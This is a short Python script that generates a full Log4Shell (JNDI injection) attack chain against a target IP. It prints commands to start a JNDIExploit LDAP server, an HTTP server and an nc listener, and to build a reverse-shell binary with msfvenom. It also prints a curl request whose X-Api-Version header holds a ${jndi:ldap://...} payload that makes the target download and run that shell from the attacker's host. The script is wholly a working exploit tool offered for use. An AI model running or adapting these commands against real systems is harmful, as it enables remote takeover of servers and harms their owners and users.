import sys
import base64

if len(sys.argv)!=3:
    print("usage: python3 command_gen.py vuln_ip attack_ip")
    exit(-1)

vuln_ip = sys.argv[1]
attack_ip = sys.argv[2]

print("java -jar JNDIExploit-1.2-SNAPSHOT.jar -i {} -p 8888".format(attack_ip))
print("python3 -m http.server 9999")
print("nc -lvvp 9000")
print("msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT=9000 -f elf -o /rev.elf".format(attack_ip))
command = ("wget http://{}:9999/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf".format(attack_ip)).encode()
command = base64.b64encode(command).decode()
print("curl %s:8080 -H 'X-Api-Version: ${jndi:ldap://%s:1389/Basic/Command/Base64/%s}'"%(vuln_ip,attack_ip,command))